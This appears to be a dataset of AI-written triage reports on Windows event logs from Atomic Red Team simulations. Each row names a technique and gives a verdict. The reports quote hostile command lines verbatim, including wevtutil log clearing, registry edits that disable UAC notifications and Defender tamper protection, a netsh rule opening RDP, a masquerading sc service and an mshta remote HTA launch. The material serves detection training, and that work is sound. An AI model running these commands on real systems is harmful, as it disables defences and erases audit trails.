   - The logs show multiple instances where `wevtutil.exe` and `conhost.exe` are used around the same time as the log-clearing activities. While it's not inherently malicious, given the context, it might relate to log management or viewer commands executed manually for assessment or clearing of logs.

5. **Expected Software Updates**:
   - The logs also include activities involving Microsoft Edge updates. While these appear routine and are using system-level accounts (`NT AUTHORITY\SYSTEM`), they match expected Microsoft Edge update operations based on file paths and commands.

**Assessment**:
- **SUSPICIOUS**: While there are legitimate reasons for the activities noted (system maintenance and updates, for example), the timing and combination of log clearing, time manipulation, and registry editing suggest potential unauthorized or adversary actions that require further investigation. Specifically, the `admin_test` user account should be scrutinized, and any other indicators of compromise (IoCs) should be cross-referenced within network and security monitoring systems.

**Guidance and Next Steps**:
- Immediately investigate the user account `admin_test` for legitimacy and activity context.
- Review any associated network logs, endpoint protection logs, and user account activity around the time of noted events.

### Suspicious Activities Identified:

1. **Repeated Usage of `cmd.exe` and File Manipulations:** 
   - Several instances of `cmd.exe` are executing command-line operations to check for the existence of a file named `T1564.001-9.txt` and manipulating its content. This behavior can align with tactics related to execution or hiding files, consistent with T1564.001, which is part of the MITRE ATT&CK framework for hiding artifacts.

2. **Execution of PowerShell Commands:**
   - There is an execution of PowerShell to manipulate file attributes, making the file hidden (`$file.attributes='Hidden'`). PowerShell is frequently used in automation and configuration tasks but excessively using it for file operations can raise suspicion, especially in conjunction with other indicators here.

3. **Clearing of Event Logs:**
   - The security log indicates that the event logs, including the Security, System, and Windows PowerShell logs have been cleared by the user `admin_test`. Cleared logs are a significant red flag, often associated with malicious activities to cover tracks after unauthorized actions.

4. **Usage of `wevtutil` to Clear Logs:**
   - The `wevtutil.exe` program is used multiple times to clear logs, as indicated by commands targeting Microsoft Windows Sysmon, Application, System, Security, and PowerShell channels. This is consistent with attempts to remove traces of activities.

### Conclusion:

The collected evidence strongly suggests that the activities are **MALICIOUS**. The combination of manipulating and hiding files with PowerShell, the clearing of crucial event logs using `wevtutil`, and the execution patterns closely align with typical behaviors observed during post-exploitation processes.

### Recommended Actions:

1. **Isolation of the Affected Host:**
   - Immediately isolate the host (`Server002`) from the network to prevent potential lateral movement or further data exfiltration.

2. **Deep Forensic Analysis:**
   - Conduct thorough forensic imaging and analysis of the host to identify additional indicators of compromise (IOCs) and potential threat actor activity.

3. **Review and Strengthen Security Policies:**
   - Review user privileges and auditing policies to ensure that sensitive actions, such as log clearing, are restricted and alert relevant security teams when attempted.

4. **Comprehensive Threat Hunt:**
   - Perform a threat hunt across the network for similar indicators to ascertain if there are other compromised systems.

Invoke HTML Application - Direct download from URI,"Upon analyzing the provided Windows event logs, several indicators of potentially malicious activity are evident. Here's a breakdown of the suspicious findings:

1. **Clearing of Event Logs**:
   - The security log entry with `EventID: 1102` and Sysmon log entries for `wevtutil.exe` clearing logs indicate that someone executed commands to clear the event logs for multiple channels (Security, System, Application, and Windows PowerShell). Clearing event logs is a known technique used by attackers to cover their tracks after performing unauthorized activities.

2. **Unusual PowerShell Activity**:
   - The Windows PowerShell logs and Sysmon logs show the execution of a PowerShell command that carries out an unusual operation using `Invoke-ATHHTMLApplication` with an external URI (`https://raw.githubusercontent.com/redcanaryco/atomic-red-team/.../T1218.005.hta`). This script potentially downloads and executes remote content using `mshta.exe`, a known living-off-the-land binary often used for malicious purposes.

3. **High-Integrity Processes**:
   - The Sysmon logs show several high-integrity level processes initiated by `admin_test`. Combined with the activity of clearing logs and executing scripts, this suggests potential privilege misuse.

These activities combined indicate a significant likelihood of malicious behavior:

- The **log clearing** actions are typically associated with an attempt to hide unauthorized activities.
- The **external PowerShell command** execution pulling a script from a public repository is highly suspicious and aligns with known attack vectors exploiting trusted processes to execute malicious code.

### Resolution: MALICIOUS

This analysis concludes the activities in the logs are malicious, especially given the log clearing and PowerShell execution with remote content retrieval. Immediate actions should be taken, including:

- Isolating the affected host to prevent any further malicious activity.
- Conducting a full forensic analysis on `Server002` to identify the extent of the intrusion.
- Reviewing and potentially resetting credentials and permissions for accounts involved (`admin_test`).
- Monitoring network traffic for similar behavior on other systems.
- Implementing stricter auditing and alerting policies on event log modifications and suspicious PowerShell activity."
Provlaunch.exe Executes Arbitrary Command via Registry Key,"Upon analysis of the provided logs, several key observations emerge that denote potentially malicious activity and system misusage, most notably involving the clearing of event logs and suspicious command executions.

### Observations & Analysis:

1. **Clearing of Event Logs**:
   - **Security Log Cleared**: EventID 1102 in the Security logs indicates that the security log was cleared by the user 'admin_test'. 
   - **System Log Cleared**: EventID 104 indicates that the system log was also cleared by user 'admin_test' across multiple events. 
   - Clearing logs is a common tactic used by attackers to cover tracks and is a strong indicator of nefarious activity.

2. **Suspicious Command Execution**:
   - **Use of `wevtutil`**: The Sysmon logs show repeated use of `wevtutil.exe` with commands to clear logs ('cl' switches), executed by the user 'admin_test'. The clearing operations were performed on differing log channels such as Microsoft-Windows-Sysmon/Operational, Application, System, and Windows PowerShell.
   - **Command Execution via `cmd.exe`**: A command was executed (EventID 17983) that used `cmd.exe` to manipulate registry entries for setting up launch parameters (`reg.exe`), and eventually launching `calc.exe` through `provlaunch.exe`. This technique of using legitimate executables to execute payloads is often associated with evasive tactics.

3. **Privilege and Execution Context**:
   - Most of these key actions occurred under high integrity level and often involved the 'admin_test' user, a presumed administrative user account on the system, which may indicate misuse of privileged accounts.

4. **Compromised Windows Time Service**:
   - Changes in system time (EventID 4616) around the timeframe of suspicious activities might indicate tampering with time settings to mislead time-stamps within event logs and forensic records.

### Assessment:

The combination of event log clearing, suspicious use of `cmd.exe` for launching applications, and privilege misuse under the 'admin_test' account strongly aligns with patterns of malicious behavior observed in compromised system scenarios. 

### Resolution: MALICIOUS

### Recommendations:

1. **Immediate Containment**: Isolate the affected system (Server002) from the network to prevent further potential data exfiltration or lateral movement.

2. **Credentials Review**: Change credentials for 'admin_test' and other privileged accounts across the environment.

3. **Incident Response Activation**: Engage incident response to conduct a deeper forensic investigation, capturing memory, disk, and network artifacts as per standard incident protocols.

4. **Audit and Monitoring**: Review and tighten logging/audit settings to detect and alert on unusual activities such as log clearing in the future. Implement stricter controls around process execution, particularly for dual-use executables like cmd.exe and wevtutil.exe.

5. **Comprehensive Environment Check**: Assess other systems for similar activities to determine if this compromise extends beyond this host."
Lolbin Gpscript startup option,"Upon reviewing and analyzing the provided Windows event logs, several indicators of potentially malicious or suspicious activity were identified, particularly surrounding the event logs clearing. This action, when not properly justified, can be a significant sign of an attempt to cover tracks in a security incident. 

### Detailed Analysis:

1. **Log Clearing Activity:**
   - **Security Log Clearing:**
     - Event ID 1102: Indicates that the audit log was cleared on `Server002` by `admin_test`. The log clearing of the Security channel (via `wevtutil.exe cl Security`) is particularly concerning because the security log often contains vital information on access control, policy changes, and audit logs.
   - **System and Windows PowerShell Log Clearing:**
     - Event ID 104: The System and Windows PowerShell channels were also cleared, which is suspicious as these logs can have critical information about system health and script executions.
   - Suspect: `admin_test` account seems to be actively involved in clearing these logs, which might suggest an insider threat or compromise of this user account.

2. **Unusual Command-Line Executions:**
   - The use of `wevtutil.exe` to clear logs and `C:\Windows\System32\cmd.exe /c Gpscript /startup` are both noteworthy. Executing such commands suggest activities normally not consistent with typical administrative tasks.
   - The command-line arguments used indicate automation or scripting which might be used as part of a malicious activity or for persistence.

3. **Time Synchronization and Change Events:**
   - Time synchronization adjustments (Event ID 4616) by `LOCAL SERVICE` through `svchost.exe`. While not inherently malicious, if done without legitimate administrative purpose, it could potentially be part of an attack technique to mislead system time stamps for log entries.

4. **Processes Executed by SYSTEM Account:**
   - Numerous executions of Microsoft Edge Update processes under `NT AUTHORITY\SYSTEM` are noted, which appear legitimate in terms of regular update activities, although typically such operations should not intersect with system maintenance tasks related to log clearances performed by a user account.

### Conclusion and Resolution:

The combination of cleared logs, abnormal command-line executions related to log management utilities, and the escalated privileges indicates a strong possibility of unauthorized activity or deliberate actions to conceal activities typically associated with malicious intent.

Resolution: **MALICIOUS.**

### Recommendations for Remediation:

1. **Immediate Incident Response:**
   - Investigate the `admin_test` account for possible compromise; inspect other associated activities.

Disable UAC notification via registry keys,"### Detailed Analysis

#### Indicators of Malicious Activity

1. **Event Log Clearing**: Multiple instances of log deletions were detected:
   - **Event ID 104 (System Log)** and **Event ID 1102 (Security Log)**: These entries indicate that the logs were cleared by a user with the username `admin_test`. Log clearing can be a common tactic used by attackers to cover their tracks, especially if performed unexpectedly or without a known maintenance window.

2. **Wevtutil Execution**:
   - The frequent invocation of `wevtutil.exe` to clear logs (as seen in the Sysmon logs) correlates with the log clearing events observed. This utility is used for managing Windows event logs and is commonly associated with post-exploitation activity to hide malicious actions.

3. **Suspicious Registry Modification**:
   - The execution of `cmd.exe` with the command line involving registry modifications (`reg add ""HKLM\SOFTWARE\Microsoft\Security Center"" /v UACDisableNotify /t REG_DWORD /d 1 /f`). This is indicative of an attempt to disable User Account Control (UAC) notifications, possibly to hinder detection of unauthorized changes and is typically a red flag for attempted privilege escalation or persistence setup.

#### Anomalous Behavior

- **Frequent Process Spawning**: Multiple invocations of standard Windows utilities (.e.g., `conhost.exe`, `whoami.exe`, `hostname.exe`) in a short time frame under the same session could indicate scripting for reconnaissance or lateral movement.
  
- **Edge Update Activity**: There is a significant amount of activity regarding the Microsoft Edge Update process, including various executable invocations within Edge's updating mechanism. Though this itself appears to be normal update activity, in the context of other suspicious activities, it needs to be considered in correlation with potential malicious use of legitimate executable pathways.

#### Implications

- The pattern of log deletion coupled with command-line registry changes and the use of administrative tools for potentially unauthorized actions strongly suggests a compromise or at least unauthorized administrative activities.

#### Assessment

- **Resolution**: MALICIOUS

Indirect Command Execution - conhost.exe,"### Analysis of Windows Event Logs:

#### Suspicious or Anomalous Behavior:

1. **Event Log Clearing (Event ID 1102)**
   - The logs indicate that multiple event logs (Security, System, and Windows PowerShell) were cleared by a user named `admin_test`. Clearing event logs can be indicative of malicious activity as it is often performed to cover tracks. The timestamps for these log clearances are close to each other, suggesting an attempt to remove evidence of unauthorized actions.

2. **Time Change Events (Event ID 4616)**
   - There are multiple time change events in a short duration, which is unusual. Although they are logged by `LOCAL SERVICE` and involve the `svchost.exe` process, monitoring for any potential tampering with time settings is advisable, as this could disrupt log-based detections.

3. **Processes Executed by User `admin_test`**
   - Multiple command-line utilities (`wevtutil.exe`) were executed from the `admin_test` account, aimed at clearing logs. The `wevtutil.exe` utility is being used to clear logs such as Sysmon and Application logs (`cl` command), which matches the events mentioned above about log clearance.

4. **Unusual Command Execution (Sysmon Event ID 1)**
   - There is a `cmd.exe` execution with the command `/c conhost.exe ""notepad.exe""`. This appears anomalous since `cmd.exe` usually isn't used to start a console and notepad together. This could indicate an attempt to execute scripts or commands masquerading as benign applications.

5. **Repeated Use of Console Host (`conhost.exe`) and Command Line**
   - The extensive spawning of `conhost.exe` processes as parents to various command-line tools indicates heavy command-line usage, potentially for scripting or automation tasks. Such activity should be correlated with legitimate administrative tasks, or if not, investigated further.

#### Indicators of Malicious Activity:

1. **Log Clearing via `wevtutil.exe`**
   - The use of the command `wevtutil cl` by an administrative user indicates intentional log clearing, a known tactic for evading detection.

2. **Excessive Use of System Tools**
   - The frequent use of system utilities and the timing with event log clearances suggest efforts to potentially cover tracks of suspicious activities.

#### Threats or Risks Identified:

- ***Log Clearing***: Any unauthorized log clearing poses a threat by obscuring malicious activity.
- ***Commands Execution***: The triggering of various processes and command-line tools by a specific user should be investigated for script injection or malicious commands.

4. **Forensic Analysis**:
   - Conduct a deeper forensic examination if system integrity signs anomalies, focusing on the period around these logs clearing operations.

5. **Incident Response**:
   - If unauthorized log wiping is confirmed, initiate an incident response. Evaluate whether other machines or users might have been compromised.

### Resolution:

**SUSPICIOUS** - The logs demonstrate signs of suspicious activity, specifically due to intentional log clearing and unusual command executions that require further investigation to rule out malicious intent."
Activate Windows NoRun Group Policy Feature,"Upon reviewing the provided logs, here is the analysis of the events:

### Suspicious and Anomalous Behaviors:
1. **Registry Modification via CMD and REG.EXE**:
   - The event `ProcessId: 5696` shows the execution of `cmd.exe` with the command line to add a registry key that modifies the policy in the Windows `Explorer` to disable the Run command: 
     ```
     ""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoRun /t REG_DWORD /d 1 /f
     ```
   - Following the `cmd.exe`, `reg.exe`, `ProcessId: 1540` is used to actually make this registry modification.

2. **Event Log Clearing**:
   - **System Logs** (`ProcessId: 2016`), **Powershell Logs** (`ProcessId: 3752`), and **Security Logs** (`ProcessId: 2528`) have been cleared by the user `admin_test`.
   - Clearing event logs can be indicative of an attempt to cover tracks of malicious activities.

3. **Use of `whoami.exe` and `hostname.exe`**:
   - While the use of `whoami.exe` and `hostname.exe` might be normal, in conjunction with other suspicious activities such as registry edits and log clearing, they may indicate information gathering activities.

4. **Time Change Events**:
   - Frequent time change events captured through `svchost.exe` might be seen in a normal context but, when occurring alongside registry changes and log clearances, they raise suspicion. However, it appears the time adjustments seem more systemic rather than user-driven.

5. **Wevtutil.exe usage**:
   - `wevtutil.exe` found in the logs is used to manage Windows event logs. Considering that logs were cleared multiple times, its execution (`ProcessId: 3328`, `6308`, etc.) alongside cleared logs indicates possible manipulation of log data.

### Assessment:
- The combination of registry modifications, event log clearing, and the usage of system tools like `cmd.exe` and `reg.exe`, as well as `wevtutil.exe`, suggests an intent to hide potentially malicious activities after altering system configurations.
  
### Resolution:
Based on the presented evidence, the activities observed in the logs can be classified as:
- **MALICIOUS**: The actions of modifying the registry to restrict user functionalities and clearing the system event logs to erase traces strongly suggest malicious intent.

2. **Forensic Investigation**: Perform a deeper forensic analysis of `SERVER002`, especially focusing on the timeline around when these logs were cleared.
3. **Policy Review**: Review and potentially strengthen security policies, especially around log retention and access to registry modifications.
4. **User Awareness and Training**: Ensure users are educated about appropriate system use policies and the implications of such activities.
5. **Threat Intelligence**: Correlate this incident with known threat indicators to determine if it aligns with any known attack patterns."
Creating W32Time similar named service using sc,"## Analysis of the Windows Event Logs

### Suspicious and Anomalous Observations

1. **Log Clearing Activities:**
   - The `wevtutil.exe` utility was used multiple times to clear event logs (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell`) by the user `admin_test` from the computer `Server002`. This is evident from the System and Sysmon logs, and corresponds with Event IDs 104 and 1102.
   - Log clearing is commonly seen in malicious activities to cover tracks after certain harmful actions.

2. **Service Creation with Anomalous Command:** 
   - A service named `win32times` was created using the command:
     ```
     cmd.exe /c sc create win32times binPath= ""cmd /c start c:\\T1036.004_NonExistingScript.ps1"" & sc qc win32times
     ```
   - It is unusual as it references a potentially non-existent script `T1036.004_NonExistingScript.ps1`, indicating a possible attempt at masquerading or evasion.

3. **Installation of a Suspicious Script:**
   - The command line for the service `win32times` involves executing a PowerShell script or command that doesn't exist on the file system, potentially indicating a failed or incomplete malicious action.
   - The non-existent script name itself (`T1036.004_NonExistingScript.ps1`) resembles a technique tagging format from knowledge bases like MITRE ATT&CK, which suggests attacker reconnaissance or attempted trickery.

4. **Correlation with Hostnames and WHOAMI Execution:**
   - The Sysmon logs show activities related to the `HOSTNAME.EXE` and `WHOAMI.EXE` commands, which are used to retrieve server names and user identity information, potentially indicative of information gathering activities.

5. **Multiple Credential Access Attempts:**
   - Event ID 5379 in the Security logs indicates repeated credential access attempts that returned a failure code (3221226021). Multiple failed credential-related events in a short span could be suggestive of unauthorized access attempts or reconnaissance.

### Assessment

The logs collectively illustrate behavior that is consistent with malicious activity:
- The clearing of multiple log files is a classic indicator of someone attempting to cover their tracks.
- The creation of a service with a suspicious command and nonexistent script points toward an unauthorized activity.
- Multiple failed credential access attempts signal possible unauthorized or brute force attempts.
  
**Resolution: MALICIOUS -** Based on the analysis of these logs, there is sufficient evidence to classify these events as indicative of malicious activity. Immediate action is required to prevent further compromise and to minimize damage.

### Guidance

1. **Immediate Response:**
   - Isolate the affected host (Server002) from the network to prevent the propagation of any further malicious actions.
   - Investigate user account `admin_test` for potential misuse or unauthorized access. Consider password changes and auditing of actions associated with the account.
   - Review and recover deleted logs if possible, to gain further insight into the actions taken on this server before logs were cleared.

2. **Forensic Analysis:**
   - Conduct a full disk forensic analysis on the affected machine to look for other indicators of compromise.
   - Review file system activities around the `c:\T1036.004_NonExistingScript.ps1` path.

3. **Security Enhancement:**
   - Reinforce monitoring for suspicious activities related to log clearing and service creation. Implement more granular logging and backups of logs.
   - Conduct a thorough check of your security infrastructure and policies, ensuring that any similar vulnerabilities are identified and patched.

4. **User Awareness and Training:**
   - Train staff, particularly those with administrative privileges, to recognize and report suspect behavior on their systems.

5. **Further Investigation:**
   - Conduct a broader review of network and security events during the time frames in question to identify other possibly affected systems or malicious activities.

By implementing these recommendations, you will help ensure the integrity and security of your environment against such intrusive and malicious activities."
Open a local port through Windows Firewall to any profile,"Upon reviewing the provided logs, the following indicators of potential compromise and suspicious activities have been identified:

1. **Process and Command-Line Execution:**
   - A PowerShell command is executed to add a firewall rule allowing inbound RDP connections (`netsh advfirewall firewall add rule name=""Open Port to Any"" dir=in protocol=tcp localport=3389 action=allow profile=any`). This action is suspicious as it opens up the server to potential remote desktop connections which could be exploited, particularly if not authorized or a known change.
   - Corresponding Sysmon logs show the sequence of PowerShell and `netsh.exe` execution to achieve this.

2. **Log File Clearing:**
   - The logs indicate that several logs were cleared by the user `SERVER002\admin_test`. This is an activity often associated with attempts to cover tracks following unauthorized actions:
     - Sysmon log for the `Microsoft-Windows-Eventlog/EventID 104` indicates that the System and Windows PowerShell logs were cleared.
     - Security log for `EventID 1102` shows that the Security event log was cleared.

3. **Time Change Events:**
   - The security event log also shows a time change (`EventID 4616`). While time changes can be legitimate, in combination with other unauthorized or suspicious actions, they might be used to manipulate timestamps on events or logs.

4. **High Integrity Level Execution:**
   - The logs reveal that several commands were executed with High integrity levels, indicating elevated privileges, which could have been used maliciously.

**Assessment:**
- The combination of opening the RDP port, clearing logs, and executing high-integrity commands suggests malicious intent or unauthorized activity.
- The timing and sequence of these actions show typical patterns of a security breach where an attacker gains access, makes configuration changes to enable further access (via RDP), and attempts to clear logs to hide activity.

**Resolution: MALICIOUS**

**Guidance for Proceeding:**
1. **Immediate Response:**
   - Isolate the affected host from the network to prevent further unauthorized access or lateral movement.
   - Begin an incident response investigation to identify the method of initial compromise and any other potentially affected systems.
   - Conduct a forensic analysis of the system to gather further evidence.

2. **Remedial Actions:**
   - Roll back unauthorized changes, such as the new firewall rule, if still active.
   - Restore logs from backups if possible for more detailed investigation.
   - Conduct a thorough investigation of user accounts and privileges, focusing on `SERVER002\admin_test`.

3. **Long-term Strategy:**
   - Review and strengthen network and system monitoring to detect similar suspicious activities in the future.
   - Educate staff on security awareness and best practices to prevent escalation privileges and unauthorized access.
   - Patch systems and services regularly to mitigate known vulnerabilities."
Abusing Windows TelemetryController Registry Key for Persistence,"**Detailed Analysis of the Logs:**

### Suspicious or Anomalous Behavior:
1. **Log Clearance:**
   - Events in the System log indicate that the event logs were cleared (`EventID: 104`) by the user `admin_test`. This activity is typically suspicious, especially if there is no documented reason for such an action, as it can be indicative of an attempt to cover tracks.
   
2. **Use of `wevtutil.exe`:**
   - Multiple events in the Sysmon log show the execution of `wevtutil.exe` with command line arguments indicating the clearing of various log channels (e.g., System, Application, Security, Windows PowerShell). The same user (`SERVER002\admin_test`) that cleared the logs executed these commands. The use of `wevtutil.exe` to clear logs is a red flag for malicious activity as it suggests an attempt to obfuscate actions on the system.
   
3. **Registry Modification via `cmd.exe`:**
   - There is an event showing the execution of `cmd.exe` to add a registry key (`CommandLine: ""cmd.exe"" /c reg add...`). The command is adding a key related to `AppCompatFlags` which could be utilized for persistence or other malicious purposes.

4. **Frequent Execution of System Utilities:**
   - Processes such as `hostname.exe`, `whoami.exe`, and `cmd.exe` have been executed. While these are legitimate Windows utilities, their execution could indicate reconnaissance activities if not correlated with normal administrative tasks.

### Indicators of Malicious Activity or Compromise:
- The series of activities, including the clearing of logs, execution of system utilities, and modification of registry settings, strongly indicate potential malicious activity. Especially, the combination of clearing logs, and registry modifications are common tactics used in post-exploitation phases for persistence and to cover tracks.

### Assessment:
The logs present several indicators that suggest malicious intent or compromise:
- **Clearing of event logs** by the user `admin_test` without justification is typically a strong indicator of malicious activity.
- **Execution of registry modification commands** via `cmd.exe` suggests potential persistence mechanisms, which should be investigated.
- **Use of `wevtutil.exe`** to clear logs, further corroborates an effort to hide activities.

### Guidance on How to Proceed:
1. **Investigate User Activity:**
   - Interview or reach out to the user `admin_test` to verify if these actions were authorized. If not, consider this account as potentially compromised.
   
2. **Conduct a Full Forensic Investigation:**
   - Analyze the endpoint for any malware or unusual modifications beyond the logs available. Check for persistence mechanisms or advanced threats.
   
3. **Review Network Activity:**
   - Examine network logs or connections associated with `Server002` around the time of the suspicious activities for any unauthorized data exfiltration or connections.

4. **Audit and Enhance Log Management:**
   - Implement more stringent logging policies to prevent unauthorized log clearance, and consider implementing SIEM solutions for better monitoring.

5. **Ensure Patch and Security Compliance:**
   - Validate that all systems, including `Server002`, are up to date with the latest patches and security practices to prevent exploitation of known vulnerabilities.

### Resolution:
**MALICIOUS** - The activities observed in the logs indicate clear signs of malicious intent, particularly the log clearances and registry modifications, which are common in cyber-attack life cycles. Immediate investigation and remediation actions are necessary to ensure any compromise is contained and mitigated."
UACME Bypass Method 56,"### Detailed Analysis:

#### Indicators of Suspicious Activity:

1. **Execution of UACMe (Akagi64.exe):**  
   - **Event ID 1:** A suspicious command was observed where `cmd.exe` was invoked with a command pointing to `Akagi64.exe`, a known component of the UACMe tool. The UACMe tool exploits User Account Control (UAC) on Windows to execute processes with elevated privileges. This process was initiated by `powershell.exe`.
   - **Anomaly:** Usage of UACMe typically suggests an attempt to bypass or escalate privileges on the system, which is considered suspicious and potentially malicious.

2. **Clearing of Event Logs:**
   - **Security Log (Event ID 1102):** The security log was cleared by `admin_test`. Clearing event logs is often associated with malicious activity, as it can be an attempt to hide tracks.
   - **System Log (Event ID 104):** The system log was also cleared, further supporting the indication of an attempt to conceal activity.

3. **Usage of `wevtutil.exe`:**
   - A series of `wevtutil.exe cl` (clear log) commands were executed, which were used to clear various logs (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell`). This further reinforces the suspicion of log tampering.

4. **Execution of `whoami.exe` and `hostname.exe`:**
   - These commands (`whoami.exe`, `hostname.exe`) are often used by malicious actors to understand their environment post-compromise. They are not inherently malicious, but their presence alongside other suspicious actions makes them noteworthy.

5. **Privileged Processes Creation:**
   - Processes were started with high integrity levels and SYSTEM-level processes (`MicrosoftEdgeUpdate.exe`) were run. While Edge Update processes can be legitimate, their execution in the context of other suspicious activities warrants further investigation.

#### Assessment of Situation:

Based on the logs, there are clear indicators of potentially malicious activity on the host `Server002`. The use of UACMe indicates a likely attempt to escalate privileges. The clearing of multiple system and security event logs suggests an effort to hide actions from audit trails, which is a strong indicator of malicious intent.

#### Resolution:

- **MALICIOUS**: The combination of these events—execution of a known UAC bypass tool, log manipulation, and command-line activity related to reconnaissance—strongly indicates malicious activity.

### Guidance on How to Proceed:

1. **Isolate the Affected System:** Immediately isolate `Server002` to prevent any further potential spread of malicious activities or compromise of other systems.

2. **Conduct a Full Forensic Investigation:**
   - Analyze memory forensics for any active malware.
   - Investigate any additional suspicious file or process activity.

3. **Review and Restore Security Logs:**
   - Attempt to recover cleared log files for more in-depth analysis.

4. **Implement Mitigation Measures:**
   - Ensure full patches are applied to prevent UAC bypass techniques.
   - Monitor network traffic for any signs of data exfiltration.

5. **Strengthen Security Posture:**
   - Enforce strong authentication practices and UAC settings.
   - Increase monitoring and alerting for log-clearing events and unusual command-line activities.

6. **User and Administrative Notification:**
   - Notify relevant IT security teams and management of the findings and actions being taken.
   - Advise all users, especially those with administrative access, to be vigilant and report any anomalies.  

This assessment should be followed by continued monitoring and investigation to fully understand the scope and impact of the compromise."
Tamper Win Defender Protection,"After conducting a thorough analysis of the provided Windows event logs, here is the detailed assessment:

### Suspicious and Anomalous Activities:

1. **Event Log Clearing:**
   - The logs indicate that event logs were cleared multiple times by the user `SERVER002\admin_test` using the `wevtutil.exe` command line utility. Specifically, this tool was used to clear the `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Windows PowerShell`, and `Security` logs.
   - Event Log IDs 1102 (Security Log cleared) and 104 (System Log cleared) were triggered at the same timestamp: `2024-10-24 17:27:03` to `2024-10-24 17:27:04`.

2. **Timestamp Anomalies:**
   - There are events indicating that the system time was modified (Event ID 4616), which is a common tactic used by attackers to hide activities or manipulate logs.

3. **Registry Modification:**
   - A suspicious registry modification is observed where `cmd.exe` was executed with parameters to disable Windows Defender Tamper Protection (`2024-10-24 17:27:05.020`). This action was executed by the user `SERVER002\admin_test` with high integrity level.

4. **Process Anomalies:**
   - `cmd.exe` executed tasks that could potentially compromise system protection settings, which is aligned with attempts to disable security features.

### Indicators of Malicious Activity:

- **Log Clearance**: Repeated clearing of critical logs such as Security, System, PowerShell, and Sysmon, along with adjusting system time, is a strong indicator of an attempt to cover tracks, which is a key indicator of malicious intent.
- **Security Feature Disablement**: The disabling of Windows Defender's Tamper Protection is a direct attempt to weaken system defenses, which indicates malicious intent to bypass or disable security measures.

### Assessment:

Given the identified events, there are clear signs of potentially compromised activity. The actions suggest a deliberate attempt to conceal actions and modify critical system settings that could enable further exploitation.

### Resolution:

- **Resolution**: MALICIOUS
- **Reasoning**: The combination of log clearance, timestamp modifications, and disabling of security features are highly indicative of malicious activity. These activities typically align with advanced persistent threats or internal threats aiming to compromise system integrity.

### Recommendations for Response:

1. **Immediate Investigation**: Investigate the actions of the user `SERVER002\admin_test` to determine if this account was compromised or if insider threats are involved.
2. **Forensic Analysis**: Perform a detailed forensic analysis of the system, including memory and network traffic examination, to identify any additional indicators of compromise.
3. **Log Monitoring**: Implement enhanced logging and monitoring solutions to detect and alert unusual activities, especially involving sensitive areas like security settings and event logs.
4. **Security Policy Review**: Review security policies to ensure that critical logs and security features are protected from unauthorized modifications or clearance.
5. **Account Security**: Review and enhance security measures for administrative accounts, including two-factor authentication and regular security audits.

The findings strongly suggest that further security actions should be taken to mitigate any potential threats and prevent future occurrences."
Control Panel Items,"Upon analyzing the logs provided, several suspicious activities can be identified that warrant further investigation. Here's a breakdown of the findings, highlighting key indicators of potential malicious activity:

1. **Event Log Clearance:**
   - The **Security** log contains multiple ""Event ID 1102"" entries, indicating that the security event log was cleared.
   - Similarly, the **System** and **PowerShell** logs show ""Event ID 104,"" which suggests these logs were cleared as well.
   - Log clearance is often an indication of an attempt to cover tracks following unauthorized or malicious activity.

2. **Unusual Commands and Process Activities:**
   - A command-line utility `wevtutil` was used to clear the logs for System, Security, and PowerShell. This was done repeatedly in rapid succession, which could suggest an automated script or malware.
   - There is usage of `cmd.exe` running a control panel CPL file from a temporary directory (`AtomicRedTeam\\T1218.002\\bin\\calc.cpl`). The use of control panel applets for execution in this manner is associated with a technique called ""DLL hijacking"" or abuse of Dynamic-Link Library files.
   - The control panel execution leads to the execution of `rundll32.exe` and `calc.exe`, which can be indicators of testing for code execution methods, likely part of post-exploitation activities.
   - The presence of temporary directories and executable paths such as `C:\\Program Files (x86)\\Microsoft\\Temp` and `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam` raises further suspicion as it aligns with file paths used by attack simulation frameworks like Atomic Red Team.

3. **Repeated Microsoft EdgeUpdate Executions:**
   - The Edge Update utility is seen executing repeatedly with varying command-line arguments like `/svc`, `/regsvc`, `/regserver`, `/ua /installsource core`, which is unusual for typical update behavior, indicating possible misuse or simulation of legitimate processes for hiding activities.

4. **Focus on User `admin_test`:**
   - Many suspicious activities seem centralized around the user `admin_test`, which can suggest either misuse of an internal account or potentially compromised credentials.

Given these findings, the resolution is classified as **SUSPICIOUS**. The activities observed are atypical for a standard operating environment and align with tactics seen in attack simulations or unauthorized access scenarios. It is recommended that further investigation be conducted to:

- Verify the intentions and executions associated with the `admin_test` account.
- Conduct a deeper forensic investigation into the chronological sequence of events leading to the clearing of logs.
- Assess whether endpoint protection or detection mechanisms were triggered during these activities.
- Identify if similar patterns are present on other systems within the environment to assess the scope of potential compromise.

Proceed with caution and ensure that any actions in response to these findings are documented and monitored for future reference."
WMI Win32_Product Class - Execute Local MSI file with an embedded EXE,"### Detailed Analysis:

Upon analyzing the supplied logs, a sequence of events have been meticulously parsed to identify any anomalies or indications of malicious activity. The logs predominantly present routine system operations. However, several elements warrant closer scrutiny:

1. **PowerShell Execution:**
   - Multiple Sysmon events exhibit the execution of `powershell.exe` by the user `SERVER002\admin_test`. Particularly concerning is the command observed at `UtcTime=2024-10-26 15:02:58.438`:
     ```powershell
     powershell.exe & {Invoke-CimMethod -ClassName Win32_Product -MethodName Install -Arguments @{ PackageLocation = 'C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1218.007\\bin\\T1218.007_EXE.msi' }}
     ```
     This command leverages `Invoke-CimMethod` to install a package which is part of the Atomic Red Team tests, often employed to simulate adversarial tactics for detection testing. This context usually indicates a benign activity linked to security testing unless unauthorized.

2. **Log Clearing:**
   - The Security and System logs exhibit entries indicating log file clearing by the user `admin_test`. Event ID `1102` in the Security log and Event ID `104` in the System log both highlight log clearing activities.
   - Log clearing is a common tactic to hide traces of malicious actions and is suspicious unless justified by maintenance needs or as part of an APT test suite in a controlled environment.

3. **Abnormal Process Executions:**
   - Another notable event is the execution of a temporary MSI file (`MSI9CF4.tmp`) created during an MSI installation process; it's detailed in both Sysmon and Application logs. This activity is linked to the installation of an Atomic Red Team MSI package, a known tool for testing defensive measures within the environment.

4. **Edge Update Operations:**
